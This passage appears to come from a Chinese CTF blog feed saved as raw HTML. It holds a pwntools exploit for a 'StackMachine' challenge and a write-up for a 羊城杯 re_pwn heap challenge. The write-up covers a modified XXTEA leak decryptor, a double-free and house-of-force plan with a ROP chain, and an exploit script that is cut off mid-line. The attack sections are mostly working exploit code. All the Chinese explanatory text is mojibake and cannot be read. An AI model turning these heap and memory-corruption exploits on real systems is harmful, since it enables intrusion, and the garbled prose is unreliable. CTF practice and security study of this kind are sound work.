python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port = <span class="number">123</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./StackMachine&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">one = <span class="number">0xf1207</span></span><br><span class="line">offset=one-<span class="number">0x06f6a0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;stack size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;data size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;initial data &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">0x1040</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;code size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;initial code &gt;&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2))</span></span><br><span class="line">p.send(p8(<span class="number">0xe</span>)+p64(<span class="number">0x601FA0</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x10000000000000000</span>-<span class="number">0x1040</span>)+p8(<span class="number">2</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">1</span>)+p8(<span class="number">1</span>)+p8(<span class="number">0xe</span>)+p64(offset)+p8(<span class="number">3</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">1</span>)+p8(<span class="number">1</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x5812a8</span>)+p8(<span class="number">3</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x10000000000000000</span>-<span class="number">0x0000000000601fa0</span>+<span class="number">0x600</span>)+p8(<span class="number">3</span>)+p8(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸæ¯_Quals_repwn</title>
      <link href="/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/"/>
      <url>/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¾ŠåŸæ¯-re-pwn"><a href="#ç¾ŠåŸæ¯-re-pwn" class="headerlink" title="ç¾ŠåŸæ¯ re_pwn"></a>ç¾ŠåŸæ¯ re_pwn</h3><blockquote><p>è®°ä¸€æ¬¡å‘çˆ¹çš„house of force</p></blockquote><span id="more"></span><p>é¦–å…ˆç¨‹åºçš„é€»è¾‘å¾ˆæ¸…æ¥šï¼š<br>add()é™åˆ¶sizeå¤§å°ä¸º0~0x68ï¼Œdele()å­˜åœ¨double freeï¼Œshowå‡½æ•°å…ˆå…è®¸å‘stackä¸Šè¾“å…¥ï¼Œä¹‹åè¿›è¡ŒåŠ å¯†è¾“å‡ºã€‚</p><p>ç¨‹å¼å”¯ä¸€çš„è¾“å‡ºå°±æ˜¯åŠ å¯†åçš„è¾“å‡ºï¼Œå› æ­¤æ­¤å¤„æ˜¯leakåœ°å€çš„åœ°æ–¹ï¼Œå¦‚æœæˆ‘ä»¬ä¸è¾“å…¥çš„è¯åŠ å¯†çš„å†…å®¹å°±æ˜¯å­˜åœ¨stackä¸Šçš„å†…å®¹ï¼Œé€šè¿‡è§£å¯†å¯ä»¥æ‹¿åˆ°åœ°å€ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000â”‚ rsp  0x7fffffffdb70 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚      0x7fffffffdb78 â€”â–¸ 0x7fffffffddb8 â€”â–¸ 0x7fffffffe1a2 â—‚â€” &#x27;XDG<span class="emphasis">_SEAT=seat0&#x27;</span></span><br><span class="line"><span class="emphasis">02:0010â”‚      0x7fffffffdb80 â€”â–¸ 0x7fffffffdda8 â€”â–¸ 0x7fffffffe176 â—‚â€” &#x27;/mnt/hgfs/share/ctf_</span>in<span class="emphasis">_2020/pwn/ycbctf/pwn2&#x27;</span></span><br><span class="line"><span class="emphasis">03:0018â”‚      0x7fffffffdb88 â—‚â€” 0x1f7ffe700</span></span><br><span class="line"><span class="emphasis">04:0020â”‚      0x7fffffffdb90 â—‚â€” 0x1f3c5d139400</span></span><br><span class="line"><span class="emphasis">05:0028â”‚      0x7fffffffdb98 â—‚â€” 0x1000000002</span></span><br><span class="line"><span class="emphasis">06:0030â”‚ rdx  0x7fffffffdba0 â—‚â€” 0x1200000033 /* &#x27;3&#x27; */</span></span><br><span class="line"><span class="emphasis">07:0038â”‚      0x7fffffffdba8 â—‚â€” 0x2400000078 /* &#x27;x&#x27; */</span></span><br><span class="line"><span class="emphasis">08:0040â”‚ rdi  0x7fffffffdbb0 â€”â–¸ 0x7ffff7ffea88 â€”â–¸ 0x7ffff7ffe9b8 â€”â–¸   libcåœ°å€ 0x7ffff7ffe728 â€”â–¸ 0x7ffff7ffe700 â—‚â€” ...</span></span><br><span class="line"><span class="emphasis">09:0048â”‚      0x7fffffffdbb8 â€”â–¸ 0x7fffffffdbf0 â€”â–¸ 0x7ffff7ffa280 â—‚â€” add      byte ptr ss:[rax], al /* &#x27;6&#x27; */       stackåœ°å€</span></span><br></pre></td></tr></table></figure><p>å¯è§é€šè¿‡è§£å¯†å¯ä»¥å¾—åˆ°stackåœ°å€å’Œlibcåœ°å€ã€‚</p><p>åŠ å¯†ç®—æ³•ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E95</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [rsp+26h] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a3;                                      <span class="comment">// a1=buf</span></span><br><span class="line">                                                <span class="comment">// a2=16</span></span><br><span class="line">                                                <span class="comment">// a3=&#x27;/* 3 */&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    num = <span class="number">35</span> / a2 + <span class="number">7</span>;                          <span class="comment">// 9æ¬¡</span></span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    v6 = a1[a2 - <span class="number">1</span>];                            <span class="comment">// buf[15]</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sum += <span class="number">0x76129BDA</span>;</span><br><span class="line">      v10 = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )            <span class="comment">// 15è½®</span></span><br><span class="line">      &#123;</span><br><span class="line">        a1[i] += (((v6 &gt;&gt; <span class="number">7</span>) ^ (<span class="number">8</span> * a1[i + <span class="number">1</span>])) + ((a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>) ^ (<span class="number">32</span> * v6)) - <span class="number">33</span>) ^ ((a1[i + <span class="number">1</span>] ^ sum ^ <span class="number">0x57</span>)</span><br><span class="line">                                                                                        + (v6 ^ *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">4LL</span> * (v10 ^ i &amp; <span class="number">3</span>) + v5))</span><br><span class="line">                                                                                        + <span class="number">63</span>);</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">      &#125;</span><br><span class="line">      a1[a2 - <span class="number">1</span>] += (((v6 &gt;&gt; <span class="number">7</span>) ^ (<span class="number">8</span> * *a1)) + ((*a1 &gt;&gt; <span class="number">2</span>) ^ (<span class="number">32</span> * v6)) - <span class="number">33</span>) ^ ((*a1 ^ sum ^ <span class="number">0x57</span>)</span><br><span class="line">                                                                               + (v6 ^ *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">4LL</span> * (v10 ^ i &amp; <span class="number">3</span>) + v5))</span><br><span class="line">                                                                               + <span class="number">63</span>);</span><br><span class="line">      v3 = a2 - <span class="number">1LL</span>;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[v3];</span><br><span class="line">      v6 = a1[v3];</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( num );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ¯”è¾ƒæ˜æ˜¾çš„åœ°æ–¹åœ¨äº<span class="number">0x76129BDA</span>ï¼Œè¿™ä¸ªæ•°å€¼ä¸€èˆ¬å­˜åœ¨äºteaåŠ å¯†ç®—æ³•ä¸­ï¼Œæ¯”è¾ƒä¸€ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯†</span></span><br><span class="line">    <span class="comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line">    <span class="comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ç¨‹åºåœ¨è°ƒç”¨åŠ å¯†å‡½æ•°å‰ä¹Ÿæœ‰4ä¸ªkeyï¼Œè€Œä¸”åªæ˜¯MXå’ŒDELTAä¸åŒï¼Œå¯è®¤å®šæ˜¯bteaç®—æ³•æ”¹çš„ï¼Œå› æ­¤å†™å‡ºè§£å¯†è„šæœ¬ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x76129BDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX ( ( ((z&gt;&gt;7)^(y<span class="string">&lt;&lt;3)) + ((y&gt;</span>&gt;2)^(z&lt;&lt;5))-0x21 ) ^ ((sum^y^0x57) + (key[(p&amp;3)^e] ^ z)+0x3f) )</span></span><br><span class="line"><span class="comment">// #define MX (((((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5)))-0x21) ^ (((sum^y^0x57) + (key[e^p&amp;3] ^ z))+0x3f))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint8_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> y,z;</span><br><span class="line">    <span class="type">uint32_t</span> sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span> + <span class="number">35</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span> + <span class="number">35</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> v[<span class="number">32</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x33</span>,<span class="number">0x12</span>,<span class="number">0x78</span>,<span class="number">0x24</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,v,<span class="number">0x10</span>);</span><br><span class="line">    btea((<span class="type">uint8_t</span>*)v, -n, k);</span><br><span class="line">    write(<span class="number">1</span>,v,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸ºELFå†processè¿›æ¥å³å¯è§£å¯†ã€‚</p><p>ä¹‹åçš„åˆ©ç”¨æ€è·¯å°±å¾ˆæ˜æ˜¾çš„hofäº†ï¼Œå…ˆdouble freeæŠŠå †ç”³è¯·åˆ°æ ˆä¸Šï¼Œç„¶åropè¯»flagã€‚</p><p>è¦æ³¨æ„çš„æ˜¯ï¼šheapå¤§å°æœ€å¤§0xx68ä¸å¤Ÿç”¨æ¥å®Œæˆropï¼Œå› æ­¤è¦å…ˆæ„é€ ä¸€æ¬¡readä»¥è¯»å…¥ropã€‚</p><p>ç¬¬ä¸€æ¬¡è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨readå†™contentçš„æ—¶å€™ï¼Œç”±äºcall readæ—¶å°†è¿”å›åœ°å€push rspï¼Œä¹‹åå¹¶æ²¡æœ‰æ‰©å±•æ ˆå¸§çš„æ“ä½œï¼Œå› æ­¤ä¹‹åå°†å¯¹åº”å­˜æ”¾ret_addrçš„åœ°æ–¹è¦†ç›–æˆæ‰§è¡Œgadgetçš„åœ°å€å³å¯ã€‚</p><p>æœ€åexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10029</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span 